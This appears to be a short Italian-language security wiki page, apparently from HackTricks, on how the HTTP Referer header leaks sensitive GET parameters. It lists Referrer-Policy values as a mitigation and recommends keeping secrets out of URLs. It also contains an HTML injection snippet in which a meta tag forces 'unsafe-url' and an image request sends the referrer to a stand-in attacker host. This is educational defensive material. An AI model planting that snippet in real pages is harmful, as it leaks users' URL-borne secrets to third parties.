# HTTP interessanti

{{#include ../banners/hacktricks-training.md}}

## Header Referrer e policy

Referrer è l'header utilizzato dai browser per indicare quale sia stata la pagina visitata in precedenza.

### Informazioni sensibili esposte

Se in un qualsiasi punto di una pagina web sono presenti informazioni sensibili nei parametri di una richiesta GET, se la pagina contiene link a fonti esterne oppure se un attacker è in grado di indurre/suggerire (tramite social engineering) all'utente di visitare un URL controllato dall'attacker, potrebbe essere possibile esfiltrare le informazioni sensibili contenute nell'ultima richiesta GET.

### Mitigazione

È possibile fare in modo che il browser segua una **Referrer-policy** che possa **evitare** l'invio delle informazioni sensibili ad altre web application:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Contromisura

È possibile ignorare questa regola utilizzando un meta tag HTML (l'attaccante deve sfruttare un'HTML injection):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Difesa

Non inserire mai dati sensibili nei parametri GET o nei percorsi dell'URL.

{{#include ../banners/hacktricks-training.md}}
